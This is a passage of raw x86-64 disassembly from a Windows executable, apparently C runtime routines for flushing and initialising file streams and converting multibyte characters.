   14000aaf8:	e8 67 c6 ff ff       	call   0x140007164
   14000aafd:	8b 50 10             	mov    0x10(%rax),%edx
   14000ab00:	8b cb                	mov    %ebx,%ecx
   14000ab02:	48 8b c6             	mov    %rsi,%rax
   14000ab05:	4c 8b 05 4c 49 00 00 	mov    0x494c(%rip),%r8        # 0x14000f458
   14000ab0c:	41 ff d0             	call   *%r8
   14000ab0f:	eb 0e                	jmp    0x14000ab1f
   14000ab11:	8b cb                	mov    %ebx,%ecx
   14000ab13:	48 8b c6             	mov    %rsi,%rax
   14000ab16:	48 8b 15 3b 49 00 00 	mov    0x493b(%rip),%rdx        # 0x14000f458
   14000ab1d:	ff d2                	call   *%rdx
   14000ab1f:	83 fb 0b             	cmp    $0xb,%ebx
   14000ab22:	77 c8                	ja     0x14000aaec
   14000ab24:	41 0f a3 dc          	bt     %ebx,%r12d
   14000ab28:	73 c2                	jae    0x14000aaec
   14000ab2a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000ab31:	00 
   14000ab32:	49 89 45 08          	mov    %rax,0x8(%r13)
   14000ab36:	83 fb 08             	cmp    $0x8,%ebx
   14000ab39:	75 b1                	jne    0x14000aaec
   14000ab3b:	e8 24 c6 ff ff       	call   0x140007164
   14000ab40:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000ab44:	89 48 10             	mov    %ecx,0x10(%rax)
   14000ab47:	eb a3                	jmp    0x14000aaec
   14000ab49:	45 84 f6             	test   %r14b,%r14b
   14000ab4c:	74 08                	je     0x14000ab56
   14000ab4e:	8d 4e 03             	lea    0x3(%rsi),%ecx
   14000ab51:	e8 d6 d2 ff ff       	call   0x140007e2c
   14000ab56:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000ab5b:	e8 80 b9 ff ff       	call   0x1400064e0
   14000ab60:	90                   	nop
   14000ab61:	cc                   	int3
   14000ab62:	cc                   	int3
   14000ab63:	cc                   	int3
   14000ab64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ab69:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000ab6e:	57                   	push   %rdi
   14000ab6f:	48 83 ec 20          	sub    $0x20,%rsp
   14000ab73:	49 8b f9             	mov    %r9,%rdi
   14000ab76:	49 8b d8             	mov    %r8,%rbx
   14000ab79:	48 8b 0a             	mov    (%rdx),%rcx
   14000ab7c:	e8 0b 04 00 00       	call   0x14000af8c
   14000ab81:	90                   	nop
   14000ab82:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000ab86:	48 8b 03             	mov    (%rbx),%rax
   14000ab89:	48 8b 00             	mov    (%rax),%rax
   14000ab8c:	48 85 c0             	test   %rax,%rax
   14000ab8f:	74 5a                	je     0x14000abeb
   14000ab91:	8b 48 14             	mov    0x14(%rax),%ecx
   14000ab94:	8b c1                	mov    %ecx,%eax
   14000ab96:	c1 e8 0d             	shr    $0xd,%eax
   14000ab99:	a8 01                	test   $0x1,%al
   14000ab9b:	74 4e                	je     0x14000abeb
   14000ab9d:	8b c1                	mov    %ecx,%eax
   14000ab9f:	24 03                	and    $0x3,%al
   14000aba1:	3c 02                	cmp    $0x2,%al
   14000aba3:	75 05                	jne    0x14000abaa
   14000aba5:	f6 c1 c0             	test   $0xc0,%cl
   14000aba8:	75 0a                	jne    0x14000abb4
   14000abaa:	0f ba e1 0b          	bt     $0xb,%ecx
   14000abae:	72 04                	jb     0x14000abb4
   14000abb0:	ff 02                	incl   (%rdx)
   14000abb2:	eb 37                	jmp    0x14000abeb
   14000abb4:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000abb8:	80 38 00             	cmpb   $0x0,(%rax)
   14000abbb:	75 0f                	jne    0x14000abcc
   14000abbd:	48 8b 03             	mov    (%rbx),%rax
   14000abc0:	48 8b 08             	mov    (%rax),%rcx
   14000abc3:	8b 41 14             	mov    0x14(%rcx),%eax
   14000abc6:	d1 e8                	shr    $1,%eax
   14000abc8:	a8 01                	test   $0x1,%al
   14000abca:	74 1f                	je     0x14000abeb
   14000abcc:	48 8b 03             	mov    (%rbx),%rax
   14000abcf:	48 8b 08             	mov    (%rax),%rcx
   14000abd2:	e8 e5 01 00 00       	call   0x14000adbc
   14000abd7:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000abda:	74 08                	je     0x14000abe4
   14000abdc:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000abe0:	ff 00                	incl   (%rax)
   14000abe2:	eb 07                	jmp    0x14000abeb
   14000abe4:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000abe8:	83 08 ff             	orl    $0xffffffff,(%rax)
   14000abeb:	48 8b 0f             	mov    (%rdi),%rcx
   14000abee:	e8 a5 03 00 00       	call   0x14000af98
   14000abf3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000abf8:	48 83 c4 20          	add    $0x20,%rsp
   14000abfc:	5f                   	pop    %rdi
   14000abfd:	c3                   	ret
   14000abfe:	cc                   	int3
   14000abff:	cc                   	int3
   14000ac00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ac05:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000ac0a:	56                   	push   %rsi
   14000ac0b:	57                   	push   %rdi
   14000ac0c:	41 56                	push   %r14
   14000ac0e:	48 83 ec 60          	sub    $0x60,%rsp
   14000ac12:	49 8b f1             	mov    %r9,%rsi
   14000ac15:	49 8b f8             	mov    %r8,%rdi
   14000ac18:	8b 0a                	mov    (%rdx),%ecx
   14000ac1a:	e8 b9 d1 ff ff       	call   0x140007dd8
   14000ac1f:	90                   	nop
   14000ac20:	48 8b 1d e9 0f 01 00 	mov    0x10fe9(%rip),%rbx        # 0x14001bc10
   14000ac27:	48 63 05 da 0f 01 00 	movslq 0x10fda(%rip),%rax        # 0x14001bc08
   14000ac2e:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   14000ac32:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000ac37:	49 3b de             	cmp    %r14,%rbx
   14000ac3a:	0f 84 88 00 00 00    	je     0x14000acc8
   14000ac40:	48 8b 03             	mov    (%rbx),%rax
   14000ac43:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000ac48:	48 8b 17             	mov    (%rdi),%rdx
   14000ac4b:	48 85 c0             	test   %rax,%rax
   14000ac4e:	74 21                	je     0x14000ac71
   14000ac50:	8b 48 14             	mov    0x14(%rax),%ecx
   14000ac53:	8b c1                	mov    %ecx,%eax
   14000ac55:	c1 e8 0d             	shr    $0xd,%eax
   14000ac58:	a8 01                	test   $0x1,%al
   14000ac5a:	74 15                	je     0x14000ac71
   14000ac5c:	8b c1                	mov    %ecx,%eax
   14000ac5e:	24 03                	and    $0x3,%al
   14000ac60:	3c 02                	cmp    $0x2,%al
   14000ac62:	75 05                	jne    0x14000ac69
   14000ac64:	f6 c1 c0             	test   $0xc0,%cl
   14000ac67:	75 0e                	jne    0x14000ac77
   14000ac69:	0f ba e1 0b          	bt     $0xb,%ecx
   14000ac6d:	72 08                	jb     0x14000ac77
   14000ac6f:	ff 02                	incl   (%rdx)
   14000ac71:	48 83 c3 08          	add    $0x8,%rbx
   14000ac75:	eb bb                	jmp    0x14000ac32
   14000ac77:	48 8b 57 10          	mov    0x10(%rdi),%rdx
   14000ac7b:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000ac7f:	48 8b 07             	mov    (%rdi),%rax
   14000ac82:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000ac87:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000ac8c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000ac91:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000ac96:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   14000ac9b:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000aca0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000aca5:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000acaa:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   14000acaf:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   14000acb4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000acb9:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000acc0:	00 
   14000acc1:	e8 9e fe ff ff       	call   0x14000ab64
   14000acc6:	eb a9                	jmp    0x14000ac71
   14000acc8:	8b 0e                	mov    (%rsi),%ecx
   14000acca:	e8 5d d1 ff ff       	call   0x140007e2c
   14000accf:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000acd6:	00 
   14000acd7:	48 83 c4 60          	add    $0x60,%rsp
   14000acdb:	41 5e                	pop    %r14
   14000acdd:	5f                   	pop    %rdi
   14000acde:	5e                   	pop    %rsi
   14000acdf:	c3                   	ret
   14000ace0:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   14000ace4:	55                   	push   %rbp
   14000ace5:	48 8b ec             	mov    %rsp,%rbp
   14000ace8:	48 83 ec 40          	sub    $0x40,%rsp
   14000acec:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   14000acf0:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000acf4:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   14000acf8:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000acfc:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000ad00:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000ad04:	48 8d 45 10          	lea    0x10(%rbp),%rax
   14000ad08:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000ad0c:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000ad10:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000ad14:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000ad18:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000ad1c:	b8 08 00 00 00       	mov    $0x8,%eax
   14000ad21:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000ad24:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000ad27:	e8 d4 fe ff ff       	call   0x14000ac00
   14000ad2c:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   14000ad30:	8b 45 20             	mov    0x20(%rbp),%eax
   14000ad33:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   14000ad37:	48 83 c4 40          	add    $0x40,%rsp
   14000ad3b:	5d                   	pop    %rbp
   14000ad3c:	c3                   	ret
   14000ad3d:	cc                   	int3
   14000ad3e:	cc                   	int3
   14000ad3f:	cc                   	int3
   14000ad40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ad45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000ad4a:	57                   	push   %rdi
   14000ad4b:	48 83 ec 20          	sub    $0x20,%rsp
   14000ad4f:	48 8b d9             	mov    %rcx,%rbx
   14000ad52:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000ad55:	8b c1                	mov    %ecx,%eax
   14000ad57:	24 03                	and    $0x3,%al
   14000ad59:	3c 02                	cmp    $0x2,%al
   14000ad5b:	75 4b                	jne    0x14000ada8
   14000ad5d:	f6 c1 c0             	test   $0xc0,%cl
   14000ad60:	74 46                	je     0x14000ada8
   14000ad62:	8b 3b                	mov    (%rbx),%edi
   14000ad64:	2b 7b 08             	sub    0x8(%rbx),%edi
   14000ad67:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   14000ad6b:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   14000ad6f:	48 89 33             	mov    %rsi,(%rbx)
   14000ad72:	85 ff                	test   %edi,%edi
   14000ad74:	7e 32                	jle    0x14000ada8
   14000ad76:	48 8b cb             	mov    %rbx,%rcx
   14000ad79:	e8 ae 03 00 00       	call   0x14000b12c
   14000ad7e:	8b c8                	mov    %eax,%ecx
   14000ad80:	44 8b c7             	mov    %edi,%r8d
   14000ad83:	48 8b d6             	mov    %rsi,%rdx
   14000ad86:	e8 25 1c 00 00       	call   0x14000c9b0
   14000ad8b:	3b f8                	cmp    %eax,%edi
   14000ad8d:	74 0a                	je     0x14000ad99
   14000ad8f:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   14000ad94:	83 c8 ff             	or     $0xffffffff,%eax
   14000ad97:	eb 11                	jmp    0x14000adaa
   14000ad99:	8b 43 14             	mov    0x14(%rbx),%eax
   14000ad9c:	c1 e8 02             	shr    $0x2,%eax
   14000ad9f:	a8 01                	test   $0x1,%al
   14000ada1:	74 05                	je     0x14000ada8
   14000ada3:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   14000ada8:	33 c0                	xor    %eax,%eax
   14000adaa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000adaf:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000adb4:	48 83 c4 20          	add    $0x20,%rsp
   14000adb8:	5f                   	pop    %rdi
   14000adb9:	c3                   	ret
   14000adba:	cc                   	int3
   14000adbb:	cc                   	int3
   14000adbc:	40 53                	rex push %rbx
   14000adbe:	48 83 ec 20          	sub    $0x20,%rsp
   14000adc2:	48 8b d9             	mov    %rcx,%rbx
   14000adc5:	48 85 c9             	test   %rcx,%rcx
   14000adc8:	75 0a                	jne    0x14000add4
   14000adca:	48 83 c4 20          	add    $0x20,%rsp
   14000adce:	5b                   	pop    %rbx
   14000adcf:	e9 0c ff ff ff       	jmp    0x14000ace0
   14000add4:	e8 67 ff ff ff       	call   0x14000ad40
   14000add9:	85 c0                	test   %eax,%eax
   14000addb:	75 21                	jne    0x14000adfe
   14000addd:	8b 43 14             	mov    0x14(%rbx),%eax
   14000ade0:	c1 e8 0b             	shr    $0xb,%eax
   14000ade3:	a8 01                	test   $0x1,%al
   14000ade5:	74 13                	je     0x14000adfa
   14000ade7:	48 8b cb             	mov    %rbx,%rcx
   14000adea:	e8 3d 03 00 00       	call   0x14000b12c
   14000adef:	8b c8                	mov    %eax,%ecx
   14000adf1:	e8 aa 12 00 00       	call   0x14000c0a0
   14000adf6:	85 c0                	test   %eax,%eax
   14000adf8:	75 04                	jne    0x14000adfe
   14000adfa:	33 c0                	xor    %eax,%eax
   14000adfc:	eb 03                	jmp    0x14000ae01
   14000adfe:	83 c8 ff             	or     $0xffffffff,%eax
   14000ae01:	48 83 c4 20          	add    $0x20,%rsp
   14000ae05:	5b                   	pop    %rbx
   14000ae06:	c3                   	ret
   14000ae07:	cc                   	int3
   14000ae08:	b1 01                	mov    $0x1,%cl
   14000ae0a:	e9 d1 fe ff ff       	jmp    0x14000ace0
   14000ae0f:	cc                   	int3
   14000ae10:	48 8b c4             	mov    %rsp,%rax
   14000ae13:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000ae17:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000ae1b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000ae1f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000ae23:	41 56                	push   %r14
   14000ae25:	48 83 ec 20          	sub    $0x20,%rsp
   14000ae29:	8b 05 d9 0d 01 00    	mov    0x10dd9(%rip),%eax        # 0x14001bc08
   14000ae2f:	33 db                	xor    %ebx,%ebx
   14000ae31:	bf 03 00 00 00       	mov    $0x3,%edi
   14000ae36:	85 c0                	test   %eax,%eax
   14000ae38:	75 07                	jne    0x14000ae41
   14000ae3a:	b8 00 02 00 00       	mov    $0x200,%eax
   14000ae3f:	eb 05                	jmp    0x14000ae46
   14000ae41:	3b c7                	cmp    %edi,%eax
   14000ae43:	0f 4c c7             	cmovl  %edi,%eax
   14000ae46:	48 63 c8             	movslq %eax,%rcx
   14000ae49:	ba 08 00 00 00       	mov    $0x8,%edx
   14000ae4e:	89 05 b4 0d 01 00    	mov    %eax,0x10db4(%rip)        # 0x14001bc08
   14000ae54:	e8 4f d0 ff ff       	call   0x140007ea8
   14000ae59:	33 c9                	xor    %ecx,%ecx
   14000ae5b:	48 89 05 ae 0d 01 00 	mov    %rax,0x10dae(%rip)        # 0x14001bc10
   14000ae62:	e8 b9 d0 ff ff       	call   0x140007f20
   14000ae67:	48 39 1d a2 0d 01 00 	cmp    %rbx,0x10da2(%rip)        # 0x14001bc10
   14000ae6e:	75 2f                	jne    0x14000ae9f
   14000ae70:	ba 08 00 00 00       	mov    $0x8,%edx
   14000ae75:	89 3d 8d 0d 01 00    	mov    %edi,0x10d8d(%rip)        # 0x14001bc08
   14000ae7b:	48 8b cf             	mov    %rdi,%rcx
   14000ae7e:	e8 25 d0 ff ff       	call   0x140007ea8
   14000ae83:	33 c9                	xor    %ecx,%ecx
   14000ae85:	48 89 05 84 0d 01 00 	mov    %rax,0x10d84(%rip)        # 0x14001bc10
   14000ae8c:	e8 8f d0 ff ff       	call   0x140007f20
   14000ae91:	48 39 1d 78 0d 01 00 	cmp    %rbx,0x10d78(%rip)        # 0x14001bc10
   14000ae98:	75 05                	jne    0x14000ae9f
   14000ae9a:	83 c8 ff             	or     $0xffffffff,%eax
   14000ae9d:	eb 75                	jmp    0x14000af14
   14000ae9f:	48 8b eb             	mov    %rbx,%rbp
   14000aea2:	48 8d 35 2f f9 00 00 	lea    0xf92f(%rip),%rsi        # 0x14001a7d8
   14000aea9:	4c 8d 35 10 f9 00 00 	lea    0xf910(%rip),%r14        # 0x14001a7c0
   14000aeb0:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   14000aeb4:	45 33 c0             	xor    %r8d,%r8d
   14000aeb7:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000aebc:	e8 2f cc ff ff       	call   0x140007af0
   14000aec1:	48 8b 05 48 0d 01 00 	mov    0x10d48(%rip),%rax        # 0x14001bc10
   14000aec8:	4c 8d 05 01 09 01 00 	lea    0x10901(%rip),%r8        # 0x14001b7d0
   14000aecf:	48 8b d5             	mov    %rbp,%rdx
   14000aed2:	48 c1 fa 06          	sar    $0x6,%rdx
   14000aed6:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   14000aeda:	48 8b c5             	mov    %rbp,%rax
   14000aedd:	83 e0 3f             	and    $0x3f,%eax
   14000aee0:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000aee4:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000aee8:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   14000aeed:	48 83 c1 02          	add    $0x2,%rcx
   14000aef1:	48 83 f9 02          	cmp    $0x2,%rcx
   14000aef5:	77 06                	ja     0x14000aefd
   14000aef7:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   14000aefd:	48 ff c5             	inc    %rbp
   14000af00:	49 83 c6 58          	add    $0x58,%r14
   14000af04:	48 83 c3 08          	add    $0x8,%rbx
   14000af08:	48 83 c6 58          	add    $0x58,%rsi
   14000af0c:	48 83 ef 01          	sub    $0x1,%rdi
   14000af10:	75 9e                	jne    0x14000aeb0
   14000af12:	33 c0                	xor    %eax,%eax
   14000af14:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000af19:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000af1e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000af23:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000af28:	48 83 c4 20          	add    $0x20,%rsp
   14000af2c:	41 5e                	pop    %r14
   14000af2e:	c3                   	ret
   14000af2f:	cc                   	int3
   14000af30:	40 53                	rex push %rbx
   14000af32:	48 83 ec 20          	sub    $0x20,%rsp
   14000af36:	e8 cd fe ff ff       	call   0x14000ae08
   14000af3b:	e8 40 1e 00 00       	call   0x14000cd80
   14000af40:	33 db                	xor    %ebx,%ebx
   14000af42:	48 8b 0d c7 0c 01 00 	mov    0x10cc7(%rip),%rcx        # 0x14001bc10
   14000af49:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   14000af4d:	e8 e2 1e 00 00       	call   0x14000ce34
   14000af52:	48 8b 05 b7 0c 01 00 	mov    0x10cb7(%rip),%rax        # 0x14001bc10
   14000af59:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   14000af5d:	48 83 c1 30          	add    $0x30,%rcx
   14000af61:	ff 15 a9 43 00 00    	call   *0x43a9(%rip)        # 0x14000f310
   14000af67:	48 83 c3 08          	add    $0x8,%rbx
   14000af6b:	48 83 fb 18          	cmp    $0x18,%rbx
   14000af6f:	75 d1                	jne    0x14000af42
   14000af71:	48 8b 0d 98 0c 01 00 	mov    0x10c98(%rip),%rcx        # 0x14001bc10
   14000af78:	e8 a3 cf ff ff       	call   0x140007f20
   14000af7d:	48 83 25 8b 0c 01 00 	andq   $0x0,0x10c8b(%rip)        # 0x14001bc10
   14000af84:	00 
   14000af85:	48 83 c4 20          	add    $0x20,%rsp
   14000af89:	5b                   	pop    %rbx
   14000af8a:	c3                   	ret
   14000af8b:	cc                   	int3
   14000af8c:	48 83 c1 30          	add    $0x30,%rcx
   14000af90:	48 ff 25 69 43 00 00 	rex.W jmp *0x4369(%rip)        # 0x14000f300
   14000af97:	cc                   	int3
   14000af98:	48 83 c1 30          	add    $0x30,%rcx
   14000af9c:	48 ff 25 65 43 00 00 	rex.W jmp *0x4365(%rip)        # 0x14000f308
   14000afa3:	cc                   	int3
   14000afa4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000afa9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000afae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000afb3:	57                   	push   %rdi
   14000afb4:	48 83 ec 50          	sub    $0x50,%rsp
   14000afb8:	33 ed                	xor    %ebp,%ebp
   14000afba:	49 8b f0             	mov    %r8,%rsi
   14000afbd:	48 8b fa             	mov    %rdx,%rdi
   14000afc0:	48 8b d9             	mov    %rcx,%rbx
   14000afc3:	48 85 d2             	test   %rdx,%rdx
   14000afc6:	0f 84 38 01 00 00    	je     0x14000b104
   14000afcc:	4d 85 c0             	test   %r8,%r8
   14000afcf:	0f 84 2f 01 00 00    	je     0x14000b104
   14000afd5:	40 38 2a             	cmp    %bpl,(%rdx)
   14000afd8:	75 11                	jne    0x14000afeb
   14000afda:	48 85 c9             	test   %rcx,%rcx
   14000afdd:	0f 84 28 01 00 00    	je     0x14000b10b
   14000afe3:	66 89 29             	mov    %bp,(%rcx)
   14000afe6:	e9 20 01 00 00       	jmp    0x14000b10b
   14000afeb:	49 8b d1             	mov    %r9,%rdx
   14000afee:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000aff3:	e8 f8 a7 ff ff       	call   0x1400057f0
   14000aff8:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000affd:	81 78 0c e9 fd 00 00 	cmpl   $0xfde9,0xc(%rax)
   14000b004:	75 22                	jne    0x14000b028
   14000b006:	4c 8d 0d 1b 0c 01 00 	lea    0x10c1b(%rip),%r9        # 0x14001bc28
   14000b00d:	4c 8b c6             	mov    %rsi,%r8
   14000b010:	48 8b d7             	mov    %rdi,%rdx
   14000b013:	48 8b cb             	mov    %rbx,%rcx
   14000b016:	e8 05 1f 00 00       	call   0x14000cf20
   14000b01b:	48 8b c8             	mov    %rax,%rcx
   14000b01e:	83 c8 ff             	or     $0xffffffff,%eax
   14000b021:	85 c9                	test   %ecx,%ecx
   14000b023:	0f 48 c8             	cmovs  %eax,%ecx
   14000b026:	eb 19                	jmp    0x14000b041
   14000b028:	48 39 a8 38 01 00 00 	cmp    %rbp,0x138(%rax)
   14000b02f:	75 2a                	jne    0x14000b05b
   14000b031:	48 85 db             	test   %rbx,%rbx
   14000b034:	74 06                	je     0x14000b03c
   14000b036:	0f b6 07             	movzbl (%rdi),%eax
   14000b039:	66 89 03             	mov    %ax,(%rbx)
   14000b03c:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000b041:	40 38 6c 24 48       	cmp    %bpl,0x48(%rsp)
   14000b046:	74 0c                	je     0x14000b054
   14000b048:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000b04d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000b054:	8b c1                	mov    %ecx,%eax
   14000b056:	e9 b2 00 00 00       	jmp    0x14000b10d
   14000b05b:	0f b6 0f             	movzbl (%rdi),%ecx
   14000b05e:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   14000b063:	e8 6c 1e 00 00       	call   0x14000ced4
   14000b068:	85 c0                	test   %eax,%eax
   14000b06a:	74 52                	je     0x14000b0be
   14000b06c:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000b071:	44 8b 49 08          	mov    0x8(%rcx),%r9d
   14000b075:	41 83 f9 01          	cmp    $0x1,%r9d
   14000b079:	7e 2f                	jle    0x14000b0aa
   14000b07b:	41 3b f1             	cmp    %r9d,%esi
   14000b07e:	7c 2a                	jl     0x14000b0aa
   14000b080:	8b 49 0c             	mov    0xc(%rcx),%ecx
   14000b083:	8b c5                	mov    %ebp,%eax
   14000b085:	48 85 db             	test   %rbx,%rbx
   14000b088:	4c 8b c7             	mov    %rdi,%r8
   14000b08b:	ba 09 00 00 00       	mov    $0x9,%edx
   14000b090:	0f 95 c0             	setne  %al
   14000b093:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000b097:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000b09c:	e8 cb e5 ff ff       	call   0x14000966c
   14000b0a1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000b0a6:	85 c0                	test   %eax,%eax
   14000b0a8:	75 0f                	jne    0x14000b0b9
   14000b0aa:	48 63 41 08          	movslq 0x8(%rcx),%rax
   14000b0ae:	48 3b f0             	cmp    %rax,%rsi
   14000b0b1:	72 3e                	jb     0x14000b0f1
   14000b0b3:	40 38 6f 01          	cmp    %bpl,0x1(%rdi)
   14000b0b7:	74 38                	je     0x14000b0f1
   14000b0b9:	8b 49 08             	mov    0x8(%rcx),%ecx
   14000b0bc:	eb 83                	jmp    0x14000b041
   14000b0be:	8b c5                	mov    %ebp,%eax
   14000b0c0:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000b0c6:	48 85 db             	test   %rbx,%rbx
   14000b0c9:	4c 8b c7             	mov    %rdi,%r8
   14000b0cc:	0f 95 c0             	setne  %al
   14000b0cf:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000b0d3:	41 8d 51 08          	lea    0x8(%r9),%edx
   14000b0d7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000b0dc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000b0e1:	8b 48 0c             	mov    0xc(%rax),%ecx
   14000b0e4:	e8 83 e5 ff ff       	call   0x14000966c
   14000b0e9:	85 c0                	test   %eax,%eax
   14000b0eb:	0f 85 4b ff ff ff    	jne    0x14000b03c
   14000b0f1:	e8 4a c6 ff ff       	call   0x140007740
   14000b0f6:	83 c9 ff             	or     $0xffffffff,%ecx
   14000b0f9:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b0ff:	e9 3d ff ff ff       	jmp    0x14000b041
   14000b104:	48 89 2d 1d 0b 01 00 	mov    %rbp,0x10b1d(%rip)        # 0x14001bc28
   14000b10b:	33 c0                	xor    %eax,%eax
   14000b10d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000b112:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000b117:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   14000b11c:	48 83 c4 50          	add    $0x50,%rsp
   14000b120:	5f                   	pop    %rdi
   14000b121:	c3                   	ret
   14000b122:	cc                   	int3
   14000b123:	cc                   	int3
   14000b124:	45 33 c9             	xor    %r9d,%r9d
   14000b127:	e9 78 fe ff ff       	jmp    0x14000afa4
   14000b12c:	48 83 ec 28          	sub    $0x28,%rsp
   14000b130:	48 85 c9             	test   %rcx,%rcx
   14000b133:	75 15                	jne    0x14000b14a
   14000b135:	e8 06 c6 ff ff       	call   0x140007740
   14000b13a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b140:	e8 db c4 ff ff       	call   0x140007620
   14000b145:	83 c8 ff             	or     $0xffffffff,%eax
   14000b148:	eb 03                	jmp    0x14000b14d
   14000b14a:	8b 41 18             	mov    0x18(%rcx),%eax
   14000b14d:	48 83 c4 28          	add    $0x28,%rsp
   14000b151:	c3                   	ret
   14000b152:	cc                   	int3
   14000b153:	cc                   	int3
   14000b154:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b159:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000b15e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000b163:	57                   	push   %rdi
   14000b164:	41 56                	push   %r14
   14000b166:	41 57                	push   %r15
   14000b168:	48 83 ec 20          	sub    $0x20,%rsp
   14000b16c:	4c 8b f1             	mov    %rcx,%r14
   14000b16f:	48 85 c9             	test   %rcx,%rcx
   14000b172:	74 74                	je     0x14000b1e8
   14000b174:	33 db                	xor    %ebx,%ebx
   14000b176:	4c 8d 3d 83 4e ff ff 	lea    -0xb17d(%rip),%r15        # 0x140000000
   14000b17d:	bf e3 00 00 00       	mov    $0xe3,%edi
   14000b182:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   14000b185:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   14000b18b:	99                   	cltd
   14000b18c:	49 8b ce             	mov    %r14,%rcx
   14000b18f:	2b c2                	sub    %edx,%eax
   14000b191:	d1 f8                	sar    $1,%eax
   14000b193:	48 63 e8             	movslq %eax,%rbp
